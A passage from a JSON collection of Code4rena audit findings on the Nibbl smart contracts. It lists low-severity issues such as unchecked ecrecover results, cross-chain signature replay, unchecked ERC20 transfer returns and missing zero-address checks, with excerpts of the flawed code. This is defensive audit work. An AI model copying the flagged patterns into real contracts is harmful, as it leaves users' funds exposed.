      "summary": "\nThis bug report is about a potential issue in the NibblVault contract that could cause users' funds to be frozen. The issue is related to a function called `_getTwav` which is used in the contract. The problem arises due to a possible underflow in the timestamp subtraction, which could happen in the year 2106. This is because the contract is using an older version of Solidity, which has different rules for arithmetic operations. The impact of this issue is that an essential feature of the contract may become unavailable, causing users' funds to be stuck. The recommendation is to change the code to handle the timestamp subtraction differently. The severity of this issue is debated among the community, with some saying it is a high severity issue while others argue it is a medium severity issue. However, the judges have ultimately decided to classify it as a medium risk finding. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/178",
      "tags": [],
      "finders": []
    },
    {
      "id": "5535",
      "title": "[L-05] ",
      "impact": "LOW",
      "content": "<h2 id=\"l-05-_safemint-should-be-used-rather-than-_mint-wherever-possible\" style=\"position:relative;\"><a href=\"#l-05-_safemint-should-be-used-rather-than-_mint-wherever-possible\" aria-label=\"l 05 _safemint should be used rather than _mint wherever possible permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] <code>_safeMint()</code> should be used rather than <code>_mint()</code> wherever possible</h2>\n<p><code>_mint()</code> is <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L271\">discouraged</a> in favor of <code>_safeMint()</code> which ensures that the recipient is either an EOA or implements <code>IERC721Receiver</code>. Both <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L238-L250\">OpenZeppelin</a> and <a href=\"https://github.com/Rari-Capital/solmate/blob/4eaf6b68202e36f67cab379768ac6be304c8ebde/src/tokens/ERC721.sol#L180\">solmate</a> have versions of this function</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Basket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_curator</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L24\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L24</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-05-_safemint-should-be-used-rather-than-_mint-wherever-possible",
      "tags": [],
      "finders": []
    },
    {
      "id": "5534",
      "title": "[L-02] ",
      "impact": "LOW",
      "content": "<h2 id=\"l-02-ecrecover-not-checked-for-signer-address-of-zero\" style=\"position:relative;\"><a href=\"#l-02-ecrecover-not-checked-for-signer-address-of-zero\" aria-label=\"l 02 ecrecover not checked for signer address of zero permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] <code>ecrecover()</code> not checked for signer address of zero</h2>\n<p>The <code>ecrecover()</code> function returns an address of zero when the signature does not match. This can cause problems if address zero is ever the owner of assets, and someone uses the permit function on address zero. If that happens, any invalid signature will pass the checks, and the assets will be stealable. In this case, the asset of concern is the vaultâ€™s ERC20 token, and fortunately OpenZeppelinâ€™s implementation does a good job of making sure that address zero is never able to have a positive balance. If this contract ever changes to another ERC20 implementation that is laxer in its checks in favor of saving gas, this code may become a problem.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NibblVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">563</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signer</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ecrecover</span><span class=\"mtk1\">(</span><span class=\"mtk11\">toTypedMessageHash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">structHash</span><span class=\"mtk1\">), </span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">r</span><span class=\"mtk1\">, </span><span class=\"mtk12\">s</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L563\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L563</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-02-ecrecover-not-checked-for-signer-address-of-zero",
      "tags": [],
      "finders": []
    },
    {
      "id": "4972",
      "title": "[L-09] Incorrect comments",
      "impact": "LOW",
      "content": "\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol   #1\n\n/// @audit ERC1155, not ERC721\n58:      /// @notice withdraw an ERC721 token from this contract into your wallet\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L58>\n\n```solidity\nFile: contracts/Twav/Twav.sol   #2\n\n/// @audit or zero if there have been fewer than four blocks\n34:      /// @return _twav TWAV of the last 4 blocks\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L34>\n\n```solidity\nFile: contracts/Twav/Twav.sol   #3\n\n/// @audit of the last four updates, not necessarily of the last four blocks (i.e. may be blocked that were skipped)\n34:      /// @return _twav TWAV of the last 4 blocks\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L34>\n\n## Non-Critical Issues\n\n|    | Issue                                                                                                          | Instances |\n| -- | :------------------------------------------------------------------------------------------------------------- | :-------: |\n| 1  | Consider addings checks for signature malleability                                                             |     1     |\n| 2  | Misleading variable name                                                                                       |     1     |\n| 3  | Inconsistent version of English being used                                                                     |     2     |\n| 4  | Missing `initializer` modifier on constructor                                                                  |     1     |\n| 5  | Contract implements interface without extending the interface                                                  |     1     |\n| 6  | `require()`/`revert()` statements should have descriptive reason strings                                       |     1     |\n| 7  | `public` functions not called by the contract should be declared `external` instead                            |     3     |\n| 8  | Non-assembly method available                                                                                  |     1     |\n| 9  | `2**<n> - 1` should be re-written as `type(uint<n>).max`                                                       |     4     |\n| 10 | `constant`s should be defined rather than using magic numbers                                                  |     10    |\n| 11 | Cast is more restrictive than the type of the variable being assigned                                          |     1     |\n| 12 | Missing event and or timelock for critical parameter change                                                    |     4     |\n| 13 | Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant` |     5     |\n| 14 | Inconsistent spacing in comments                                                                               |     27    |\n| 15 | Lines are too long                                                                                             |     14    |\n| 16 | Non-library/interface files should use fixed compiler versions, not floating ones                              |     1     |\n| 17 | Typos                                                                                                          |     14    |\n| 18 | File is missing NatSpec                                                                                        |     1     |\n| 19 | NatSpec is incomplete                                                                                          |     12    |\n| 20 | Event is missing `indexed` fields                                                                              |     5     |\n\nTotal: 109 instances over 20 issues\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-09-incorrect-comments",
      "tags": [],
      "finders": []
    },
    {
      "id": "4971",
      "title": "[L-08] Upgradeable contract is missing a ",
      "impact": "LOW",
      "content": "<h2 id=\"l-08-upgradeable-contract-is-missing-a-__gap50-storage-variable-to-allow-for-new-storage-variables-in-later-versions\" style=\"position:relative;\"><a href=\"#l-08-upgradeable-contract-is-missing-a-__gap50-storage-variable-to-allow-for-new-storage-variables-in-later-versions\" aria-label=\"l 08 upgradeable contract is missing a __gap50 storage variable to allow for new storage variables in later versions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-08] Upgradeable contract is missing a <code>__gap[50]</code> storage variable to allow for new storage variables in later versions</h2>\n<p>See <a href=\"https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps\">this</a> link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NibblVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NibblVault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">INibblVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">BancorFormula</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC20Upgradeable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Twav</span><span class=\"mtk1\">, </span><span class=\"mtk12\">EIP712Base</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L20\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L20</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-08-upgradeable-contract-is-missing-a-__gap50-storage-variable-to-allow-for-new-storage-variables-in-later-versions",
      "tags": [],
      "finders": []
    },
    {
      "id": "4970",
      "title": "[L-07] Vulnerable to cross-chain replay attacks due to static ",
      "impact": "LOW",
      "content": "<h2 id=\"l-07-vulnerable-to-cross-chain-replay-attacks-due-to-static-domain_separatordomainseparator\" style=\"position:relative;\"><a href=\"#l-07-vulnerable-to-cross-chain-replay-attacks-due-to-static-domain_separatordomainseparator\" aria-label=\"l 07 vulnerable to cross chain replay attacks due to static domain_separatordomainseparator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] Vulnerable to cross-chain replay attacks due to static <code>DOMAIN_SEPARATOR</code>/<code>domainSeparator</code></h2>\n<p>See <a href=\"https://github.com/code-423n4/2021-04-maple-findings/issues/2\">this</a> issue from a prior contest for details</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Utilities</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EIP712Base</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">INIT_EIP712</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">version</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">           </span><span class=\"mtk12\">domainSeperator</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">               </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">                   </span><span class=\"mtk12\">EIP712_DOMAIN_TYPEHASH</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">                   </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">name</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">                   </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">version</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">                   </span><span class=\"mtk11\">getChainID</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">                   </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">               )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">           );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">25</span><span class=\"mtk1\">:      }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L15-L25\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L15-L25</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-07-vulnerable-to-cross-chain-replay-attacks-due-to-static-domain_separatordomainseparator",
      "tags": [],
      "finders": []
    },
    {
      "id": "4969",
      "title": "[L-06] Missing checks for ",
      "impact": "LOW",
      "content": "<h2 id=\"l-06-missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\" style=\"position:relative;\"><a href=\"#l-06-missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\" aria-label=\"l 06 missing checks for address0x0 when assigning values to address state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</h2>\n<p><em>There are 6 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NibblVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">assetAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_assetAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">curator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_curator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">487</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">curator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newCurator</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L191\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L191</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NibblVaultFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">pendingBasketImplementation</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newBasketImplementation</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">pendingFeeTo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newFeeAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">pendingVaultImplementation</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newVaultImplementation</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L100\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L100</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-06-missing-checks-for-address0x0-when-assigning-values-to-address-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "4967",
      "title": "[L-04] Input array lengths may differ",
      "impact": "LOW",
      "content": "\nIf the caller makes a copy-paste error, the lengths may be mismatchd and an operation believed to have been completed may not in fact have been completed\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol   #1\n\n41:      function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L41>\n\n```solidity\nFile: contracts/Basket.sol   #2\n\n68:      function withdrawMultipleERC1155(address[] memory _tokens, uint256[] memory _tokenIds, address _to) external override {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L68>\n\n```solidity\nFile: contracts/NibblVault.sol   #3\n\n545:     function withdrawMultipleERC1155(address[] memory _assets, uint256[] memory _assetIDs, address _to) external override boughtOut {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L545>\n\n```solidity\nFile: contracts/NibblVault.sol   #4\n\n504:     function withdrawMultipleERC721(address[] memory _assetAddresses, uint256[] memory _assetIDs, address _to) external override boughtOut {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L504>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-04-input-array-lengths-may-differ",
      "tags": [],
      "finders": []
    },
    {
      "id": "4966",
      "title": "[L-03] Return values of ",
      "impact": "LOW",
      "content": "<h2 id=\"l-03-return-values-of-transfertransferfrom-not-checked\" style=\"position:relative;\"><a href=\"#l-03-return-values-of-transfertransferfrom-not-checked\" aria-label=\"l 03 return values of transfertransferfrom not checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Return values of <code>transfer()</code>/<code>transferFrom()</code> not checked</h2>\n<p>Not all <code>IERC20</code> implementations <code>revert()</code> when thereâ€™s a failure in <code>transfer()</code>/<code>transferFrom()</code>. The function signature has a <code>boolean</code> return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually making a payment</p>\n<p><em>There are 4 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Basket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L87\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L87</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Basket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 